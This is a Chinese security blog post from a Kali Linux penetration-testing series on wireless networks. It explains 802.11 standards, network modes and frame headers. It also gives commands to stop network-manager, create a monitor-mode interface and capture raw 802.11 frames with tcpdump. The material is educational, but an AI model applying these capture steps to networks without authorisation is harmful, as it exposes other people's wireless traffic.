<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">






  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="keywords" content="信息安全">
<meta property="og:type" content="article">
<meta property="og:title" content="Kali Linux渗透测试之无线渗透">
<meta property="og:url" content="http://yoursite.com/2019/01/07/Kali-Linux渗透测试之无线渗透/index.html">
<meta property="og:site_name" content="我的安全世界">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/0.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/1.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/2.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/3.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/4.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/5.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/6.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/7.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/8.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/9.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/10.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/11.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/12.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/13.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/14.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/15.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/16.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/17.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/18.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/19.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/20.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/21.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/22.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/23.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/24.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/25.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/26.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/27.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/28.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/29.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/30.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/31.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/32.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/33.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/34.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/35.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/36.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/377.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/38.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/39.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/40.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/41.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/43.png">
<meta property="og:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/44.png">
<meta property="og:updated_time" content="2019-02-19T07:55:22.965Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Kali Linux渗透测试之无线渗透">
<meta name="twitter:image" content="http://yoursite.com/images/KaliLinux_shentouceshi/wuxianshentou/0.png">






  <link rel="canonical" href="http://yoursite.com/2019/01/07/Kali-Linux渗透测试之无线渗透/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Kali Linux渗透测试之无线渗透 | 我的安全世界</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">我的安全世界</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/Kali-Linux渗透测试之无线渗透/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LoongEyes">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="我的安全世界">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Kali Linux渗透测试之无线渗透
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-07 10:15:00" itemprop="dateCreated datePublished" datetime="2019-01-07T10:15:00+08:00">2019-01-07</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2019-02-19 15:55:22" itemprop="dateModified" datetime="2019-02-19T15:55:22+08:00">2019-02-19</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Kali-Linux渗透测试/" itemprop="url" rel="index"><span itemprop="name">Kali Linux渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <hr>
<a id="more"></a>
<h1 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h1><h2 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h2><ol>
<li><p>行业迅猛发展</p>
</li>
<li><p>互联网重要入口</p>
</li>
<li><p>边界模糊</p>
</li>
<li><p>安全实施缺失而且困难</p>
</li>
<li><p>技术人员对技术不了解而造成配置不当</p>
</li>
<li><p>企业网络私自接入<code>AP</code>破坏网络边界</p>
</li>
</ol>
<hr>
<h2 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h2><p><code>IEEE</code>组织下802委员会下第11组负责开发无线局域网标准</p>
<p>无线标准涉及数据链路层(逻辑链路控制子层<code>LLC</code>、媒体访问控制子层<code>MAC</code>)，物理层</p>
<h3 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a>802.11</h3><p>发布于1997年</p>
<p>速率<code>1Mbps</code>或<code>2Mbps</code></p>
<p>传输方式</p>
<ol>
<li><p>红外线传输介质(未实现)</p>
</li>
<li><p>无线射频信号编码(调制)</p>
<ol>
<li><p>直序扩频<code>DSSS</code></p>
</li>
<li><p>跳频扩频<code>FHSS</code></p>
</li>
</ol>
</li>
</ol>
<p>媒体访问方式–<code>CSMA/CA</code>(载波侦听多路访问／冲突避免)</p>
<ol>
<li><p>根据算法侦听信道</p>
</li>
<li><p>发送数据包前进行发包声明</p>
</li>
</ol>
<p><code>Reqest to Send/Clear to Send(RTS/CTS)</code></p>
<ol>
<li><p>请求发送协议</p>
</li>
<li><p>清除发送协议</p>
</li>
</ol>
<p>计算公式：<code>c=b+log2(1+s/n)</code>  无线网络传输数据量=频宽+log2(1+信号强度/噪声(信噪比))</p>
<h3 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h3><p>信号调制方法为<code>Complementary Code Keying(CCK)</code>–补充代码键</p>
<p>无线传输速率为<code>5.5Mbit/s</code>或<code>11Mbit/s</code></p>
<p>工作频宽为<code>2.4GHz</code>(<code>2.4GHz</code>-<code>2.485GHz</code>)</p>
<p>分为14个重叠的信道</p>
<p>每个信道<code>22MHz</code>带宽</p>
<p>只有三个完全不重叠的信道</p>
<h3 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h3><p>工作频宽为<code>5GHz</code>，拥有更多的带宽空间，可容纳更多不重叠的信道</p>
<p>采用正交频分复用技术(<code>OFDM</code>)信号调制方法</p>
<p>传输速率为<code>54Mbps</code></p>
<p>每个信道<code>20MHz</code>带宽</p>
<p>变频</p>
<ol>
<li><p><code>5.15GHz</code>-<code>5.35GHz</code>室内</p>
</li>
<li><p><code>5.7GHz</code>-<code>5.8GHz</code>室外</p>
</li>
</ol>
<h3 id="802-11g"><a href="#802-11g" class="headerlink" title="802.11g"></a>802.11g</h3><p>工作频宽为<code>2.4GHz</code></p>
<p>采用正交频分复用技术(<code>OFDM</code>)信号调制方法</p>
<p>与<code>802.11a</code>速率相同，传输速率为<code>54Mbps</code></p>
<p>可全局降速，向后兼容<code>802.11b</code>，并切换为<code>CCK</code>信号调制方法</p>
<p>每个信道<code>20MHz</code>或<code>22MHz</code>带宽</p>
<h3 id="802-11n"><a href="#802-11n" class="headerlink" title="802.11n"></a>802.11n</h3><p>工作频宽为<code>2.4GHz</code>或<code>5GHz</code></p>
<p>传输速率为<code>300Mbps</code>，最高<code>600Mbps</code></p>
<p>采用<code>MIMO</code>多进多出通信技术</p>
<p>多天线，多无线电波，独立收发信号</p>
<p>可以使用<code>40MHz</code>信道带宽使数据传输速率翻倍</p>
<p>在全<code>802.11n</code>设备网络中，可以使用新报文格式，使速率达到最大</p>
<p>每个信道带宽为<code>20MHz</code>或<code>40MHz</code></p>
<hr>
<h2 id="无线网络运行模式"><a href="#无线网络运行模式" class="headerlink" title="无线网络运行模式"></a>无线网络运行模式</h2><h3 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h3><p>基础设施;基础建设</p>
<p>至少包含一个<code>AP</code>和一个<code>STATION</code>(客户端)，形成一个<code>BSS(Basic Service Set)(基本服务集)</code></p>
<p><code>AP</code>连接到有线网络，称为<code>DS(Distribution System)(分发系统)</code></p>
<p>连接到同一个<code>DS</code>的多个<code>AP</code>形成一个<code>ESS(Extended Service Set)(扩展服务集合)</code></p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/0.png" alt="0.png"></p>
<p><code>ESSID</code>：类似于<code>SSID</code>，表示多个<code>AP</code>连接到同一个<code>DS</code>上时的名称</p>
<p><code>BSSID</code>：终端设备连接到的<code>AP</code>的<code>MAC</code>地址</p>
<h5 id="SSID-Service-Set-Identifier"><a href="#SSID-Service-Set-Identifier" class="headerlink" title="SSID(Service Set Identifier)"></a>SSID(Service Set Identifier)</h5><p><code>AP</code>每秒钟约10次通过<code>Beacon</code>帧广播<code>SSID</code></p>
<p>客户端连接到无线网络后也会宣告<code>SSID</code></p>
<h3 id="AD-HOC"><a href="#AD-HOC" class="headerlink" title="AD-HOC"></a>AD-HOC</h3><p>点对点模式</p>
<p>也被称为<code>Independent Basic Service Set(IBSS)</code></p>
<p>也被称为<code>peer to peer</code>模式</p>
<p>最简单的莫过于两台安装有无线网卡的计算机实施无线互联，其中一台计算机连接<code>Internet</code>就可以共享带宽</p>
<p>有至少2个<code>STATION</code>直接通信组成</p>
<p>其中一个<code>STATION</code>负责<code>AP</code>的工作</p>
<ol>
<li><p>通过<code>Beacon</code>广播<code>SSID</code></p>
</li>
<li><p>对其他<code>STATION</code>进行身份验证</p>
</li>
</ol>
<h5 id="WIRELESS-DISTRIBUTION-SYSTEM-WDS"><a href="#WIRELESS-DISTRIBUTION-SYSTEM-WDS" class="headerlink" title="WIRELESS DISTRIBUTION SYSTEM(WDS)"></a>WIRELESS DISTRIBUTION SYSTEM(WDS)</h5><p>与有线<code>DS</code>类似，只是多个<code>AP</code>通过无线连接组成网络</p>
<ol>
<li><p><code>Bridging</code>模式(网桥模式):设备连接各自的<code>AP</code>，各个<code>AP</code>进行彼此通信</p>
</li>
<li><p><code>Repeating</code>模式(中继方式):只要无线范围允许，则允许所有<code>AP</code>和<code>STATION</code>进行通信</p>
</li>
</ol>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/1.png" alt="1.png"></p>
<h3 id="MONITOR-MODE"><a href="#MONITOR-MODE" class="headerlink" title="MONITOR MODE"></a>MONITOR MODE</h3><p><code>Monitor</code>不是一种真的无线模式</p>
<p>对无线渗透至关重要</p>
<p>允许无线网卡不进行任何筛选的抓包(正常情况下是无法抓得802.11包头的)</p>
<p>相当于有线网络的混杂模式</p>
<p>适合的网卡和驱动不但可以<code>Monitor</code>(抓包)，更可以<code>Injection</code>(注入包)</p>
<hr>
<h2 id="无线网络硬件设备及基本概念"><a href="#无线网络硬件设备及基本概念" class="headerlink" title="无线网络硬件设备及基本概念"></a>无线网络硬件设备及基本概念</h2><h3 id="无线网卡准备"><a href="#无线网卡准备" class="headerlink" title="无线网卡准备"></a>无线网卡准备</h3><p>查看硬件的检测或者断开连接的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg</span><br></pre></td></tr></table></figure></p>
<p>查看无线网卡信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure></p>
<p>无线网卡的芯片型号是成败的关键</p>
<p><code>Atheros</code>或<code>Realtek</code>芯片</p>
<h4 id="台式机"><a href="#台式机" class="headerlink" title="台式机"></a>台式机</h4><ol>
<li><p><code>USB</code>无线网卡(不支持扩展天线)</p>
</li>
<li><p><code>PCMCIA</code>(16位，已停产，支持802.11b)</p>
</li>
<li><p><code>Cardbus</code>(32位，<code>PCMCIA</code>8.0标准)</p>
</li>
<li><p><code>Express Cards</code></p>
</li>
<li><p><code>MiniPCI</code></p>
</li>
<li><p><code>MiniPCI Express</code></p>
</li>
<li><p><code>PCI</code>接口卡</p>
</li>
</ol>
<p>发送功率：决定远程连接的范围大小。使用扩展天线可增大发送功率，增加远程连接范围</p>
<p>接收灵敏性：适当降低灵敏度，接收效果更佳</p>
<p>查看兼容<code>aircrack-ng suite</code>的无线网卡型号</p>
<p><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters</a></p>
<h3 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a>无线技术概念</h3><h4 id="分贝-dB"><a href="#分贝-dB" class="headerlink" title="分贝(dB)"></a>分贝(dB)</h4><p>表示2个信号之间的差异比率，用于描述设备的信号强度，是一个相对值</p>
<h4 id="dBm"><a href="#dBm" class="headerlink" title="dBm"></a>dBm</h4><p>功率值与<code>1mW</code>进行比较的<code>dB</code>值结果</p>
<p><code>dBm=10*lg（功率值/1mW）</code></p>
<p>每增加<code>3dBm</code>，功率增加约1倍</p>
<p>每增加<code>10dBm</code>，功率增加10倍</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/2.png" alt="2.png"></p>
<h4 id="dBi"><a href="#dBi" class="headerlink" title="dBi"></a>dBi</h4><p>全向天线的信号功率增益</p>
<p>增益是指信号功率强度增加了多少<code>dB</code></p>
<p>增益过高的全向天线会变成定向天线</p>
<h4 id="dBd"><a href="#dBd" class="headerlink" title="dBd"></a>dBd</h4><p>定向天线的信号功率增益</p>
<p>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</p>
<p>功率相同时，定向天线比全向天线传输距离更远(方向正确的情况下)</p>
<p><strong>天线增益越大，信号传输距离越远</strong></p>
<hr>
<h2 id="Linux无线协议栈及配置命令"><a href="#Linux无线协议栈及配置命令" class="headerlink" title="Linux无线协议栈及配置命令"></a>Linux无线协议栈及配置命令</h2><p>无线协议栈分为内核栈与用户空间栈</p>
<p>内核栈用于底层接口及驱动程序支持</p>
<p>用户空间栈为为用户提供使用命令等</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/3.png" alt="3.png"></p>
<h3 id="802-11协议栈"><a href="#802-11协议栈" class="headerlink" title="802.11协议栈"></a>802.11协议栈</h3><ol>
<li><p><code>IEEE80211</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br><span class="line">iwlist</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>mac80211</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h3><h5 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a>查看无线网卡</h5><p>查看无线网卡信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure></p>
<p>查看无线网卡详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw list</span><br></pre></td></tr></table></figure></p>
<p>查看信道频率<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iwlist wlan0 frequency</span><br><span class="line"></span><br><span class="line">iw list</span><br></pre></td></tr></table></figure></p>
<h5 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a>扫描附近AP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iw dev wlan0 scan | grep SSID	# 查看附近AP</span><br><span class="line">iw dev wlan0 scan | egrep &quot;DS\ Parameter\ set|SSID&quot;		#查看附近AP并显示所使用的信道</span><br><span class="line">iwlist wlan0 scanning | egrep &quot;ESSID|Channel&quot;	#查看附近AP并显示所使用的信道</span><br><span class="line"></span><br><span class="line">dev：指定扫描要使用的无线设备</span><br></pre></td></tr></table></figure>
<h5 id="添加删除网卡侦听接口"><a href="#添加删除网卡侦听接口" class="headerlink" title="添加删除网卡侦听接口"></a>添加删除网卡侦听接口</h5><p>添加网卡侦听接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop	#将有冲突的network-manager服务停止</span><br><span class="line">ifconfig wlan0 up	#启动外接无线网卡</span><br><span class="line">iw dev wlan0 interface add wlan0mon type monitor	#添加无线网卡接口为monitor模式，且命名为wlan0mon</span><br><span class="line">ifconfig wlan0mon up	#启动wlan0mon无线网卡</span><br></pre></td></tr></table></figure></p>
<p>抓802.11数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i wlan0mon -s 0 -w dump.cap</span><br></pre></td></tr></table></figure></p>
<p>删除网卡侦听接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw dev wlan0mon interface del</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="RADIOTAP头部"><a href="#RADIOTAP头部" class="headerlink" title="RADIOTAP头部"></a>RADIOTAP头部</h2><p>802.11帧发送和接收依赖<code>Radiotap</code>头完成通信过程</p>
<p><code>Linux</code>系统在驱动和<code>API</code>中内建支持<code>Radiotap</code></p>
<p>802.11帧发送之前，网卡驱动在802.11头前添加<code>Radiotap</code>头</p>
<p>当网卡接收到无线帧时，驱动通知802.11的<code>MAC</code>层，此帧中包含<code>Radiotap</code>头，须先处理<code>Radiotap</code>头</p>
<p><code>Radiotap</code>为802.11帧传递额外信息，厂家可自定义，因此头长度不固定，但不可破坏<code>Radiotap</code>原始包头结构</p>
<h3 id="Radiotap包头结构"><a href="#Radiotap包头结构" class="headerlink" title="Radiotap包头结构"></a>Radiotap包头结构</h3><p>分为<code>Header</code>与<code>Data</code>两部分</p>
<p><code>Header revision</code>：始终为0(8位)</p>
<p><code>Header pad</code>：占位符，始终为0(8位)</p>
<p><code>Header length</code>：<code>Radiotap</code>包头长度，可变(16位)</p>
<p><code>Present flags</code>：数据位掩码(32位)，可扩展，取决于<code>Ext</code>位</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/4.png" alt="4.png"></p>
<p>根据数据位掩码情况，决定包头中数据部分内容</p>
<hr>
<h2 id="802-11头部"><a href="#802-11头部" class="headerlink" title="802.11头部"></a>802.11头部</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>DU</code>：数据单元，信息传输的最小数据集合</p>
<p>传递过程逐层封装</p>
<p><code>SDU</code>：服务数据单元，用于高层协议的信息单元传到低层协议</p>
<p><code>PDU</code>：协议数据单元，对于上层而言，为<code>PDU</code>；对于下层而言，为<code>SDU</code></p>
<p><code>MSDU</code>：<code>MAC</code>服务数据单元，对于媒体访问控制子层<code>MAC</code>来说</p>
<p><code>MPDU</code>：<code>MAC</code>协议数据单元，对于物理层来说为<code>PSDU</code></p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/5.png" alt="5.png"></p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/6.png" alt="6.png"></p>
<h3 id="802-11-MAC头部"><a href="#802-11-MAC头部" class="headerlink" title="802.11 MAC头部"></a>802.11 MAC头部</h3><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/7.png" alt="7.png"></p>
<p><code>Frame Control</code>（帧控制域，16位）</p>
<p><code>Duration/ID</code>（持续时间/标识，16位）：表明该帧和它的确认帧将会占用信道多长时间</p>
<p><code>Address</code>（地址域，各48位）：源地址（<code>SA</code>）、目的地址（<code>DA</code>）、传输工作站地址（<code>TA</code>）、接收工作站地址（<code>RA</code>）</p>
<p><code>Sequence Control</code>（序列控制域，16位）：用于对数据段进行编号，用于分段发送、重组</p>
<h4 id="Frame-Control（帧控制域）"><a href="#Frame-Control（帧控制域）" class="headerlink" title="Frame Control（帧控制域）"></a>Frame Control（帧控制域）</h4><p><code>Protocol Version</code>（协议版本，2位）：始终为0、1、2、3</p>
<p><code>Type</code>（类型域，2位）：指出帧的类型(管理帧0、控制帧1、数据帧2)</p>
<p><code>Subtype</code>（子类型域，4位）：指出帧的子类型。协议规定不同类型/子类型的帧完成不同功能的操作</p>
<p><code>To DS</code>（1位）：标识帧的传输方向，为1表明该帧是<code>BSS</code>向<code>DS</code>发送的帧</p>
<p><code>From DS</code>（1位）：标识帧的传输方向，为1表明该帧是<code>DS</code>向<code>BSS</code>发送的帧</p>
<p><code>To DS</code>字段与<code>From DS</code>字段的值决定着<code>MAC</code>头中4个<code>Address</code>字段的不同含义</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/8.png" alt="8.png"></p>
<ol>
<li><p>00：<code>IBSS</code>环境(此帧为管理帧或者控制帧)。或者<code>AD-Hoc</code>环境下两个<code>STATION</code>间通信</p>
</li>
<li><p>01：表示数据帧从<code>AP</code>向<code>STATION</code>传递</p>
</li>
<li><p>10：表示数据帧从<code>STATION</code>向<code>AP</code>传递</p>
</li>
<li><p>11：表示两个<code>AP</code>间通信，<code>WDS</code>环境下的<code>AP</code>间的通信。或者<code>Mesh</code>(无线网格网络)环境下<code>MP</code>间的通信</p>
</li>
</ol>
